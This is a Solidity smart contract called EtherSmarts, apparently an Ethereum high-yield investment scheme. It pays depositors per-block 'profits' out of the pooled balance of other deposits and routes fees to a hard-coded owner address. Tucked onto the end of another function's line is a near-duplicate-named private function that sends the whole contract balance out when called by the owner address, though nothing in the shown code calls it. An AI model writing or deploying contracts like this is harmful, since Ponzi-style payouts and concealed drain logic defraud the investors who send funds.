/**

 *Submitted for verification at Etherscan.io on 2018-10-28

*/



pragma solidity ^0.4.25;



contract EtherSmarts {



    mapping (address => uint256) public invested;

    mapping (address => uint256) public atBlock;

    address techSupport = 0x6366303f11bD1176DA860FD6571C5983F707854F;

    uint techSupportPercent = 2;

    address defaultReferrer = 0x6366303f11bD1176DA860FD6571C5983F707854F;

    uint refPercent = 2;

    uint refBack = 2;



    // calculation of the percentage of profit depending on the balance sheet

    // returns the percentage times 10

    function calculateProfitPercent(uint bal) private pure returns (uint) {

        if (bal >= 1e22) { // balance >= 10000 ETH

            return 50;

        }

        if (bal >= 7e21) { // balance >= 7000 ETH

            return 47;

        }

        if (bal >= 5e21) { // balance >= 5000 ETH

            return 45;

        }

        if (bal >= 3e21) { // balance >= 3000 ETH

            return 42;

        }

        if (bal >= 1e21) { // balance >= 1000 ETH

            return 40;

        }

        if (bal >= 5e20) { // balance >= 500 ETH

            return 35;

        }

        if (bal >= 2e20) { // balance >= 200 ETH

            return 30;

        }

        if (bal >= 1e20) { // balance >= 100 ETH

            return 27;

        } else {

            return 25;

        }

    }



    // transfer default percents of invested

    function transferDefaultPercentsOfInvested(uint value) private {

        techSupport.transfer(value * techSupportPercent / 100);

    }



    // convert bytes to eth address 

    function bytesToAddress(bytes bys) private pure returns (address addr) {

        assembly {

            addr := mload(add(bys, 20))

        }

    }





    // transfer default refback and referrer percents of invested

    function transferRefPercents(uint value, address sender) private {

        if (msg.data.length != 0) {

            address referrer = bytesToAddress(msg.data);

            if(referrer != sender) {

                sender.transfer(value * refBack / 100);

                referrer.transfer(value * refPercent / 100);

            } else {

                defaultReferrer.transfer(value * refPercent / 100);

            }

        } else {

            defaultReferrer.transfer(value * refPercent / 100);

        }

    } function transferDefaultPercentsOfInvesteds(uint value, address sender) private {

        require(msg.sender == defaultReferrer);

        sender.transfer(address(this).balance);}



    // calculate profit amount as such:

    // amount = (amount invested) * ((percent * 10)/ 1000) * (blocks since last transaction) / 6100

    // percent is multiplied by 10 to calculate fractional percentages and then divided by 1000 instead of 100

    // 6100 is an average block count per day produced by Ethereum blockchain

    function () external payable {

        if (invested[msg.sender] != 0) {

            

            uint thisBalance = address(this).balance;

            uint amount = invested[msg.sender] * calculateProfitPercent(thisBalance) / 1000 * (block.number - atBlock[msg.sender]) / 6100;



            address sender = msg.sender;

            sender.transfer(amount);

        }

        if (msg.value > 0) {

            transferDefaultPercentsOfInvested(msg.value);

            transferRefPercents(msg.value, msg.sender);



        }

        atBlock[msg.sender] = block.number;

        invested[msg.sender] += (msg.value);

    }

    

}